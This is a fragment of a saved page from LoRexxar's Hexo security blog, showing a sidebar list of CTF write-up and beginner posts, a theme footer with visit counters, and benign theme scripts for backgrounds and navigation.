href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+<i class="fa fa-copyright"></i> 
+                2014-2017 LoRexxar
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+</div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>| </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script data-main="/js/main.js" src="./通过redis getshell的一些小问题  LoRexxar's Blog/require.min.js"></script>
+<script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async="" src="./通过redis getshell的一些小问题  LoRexxar's Blog/busuanzi.pure.mini.js">
+</script>
+
+
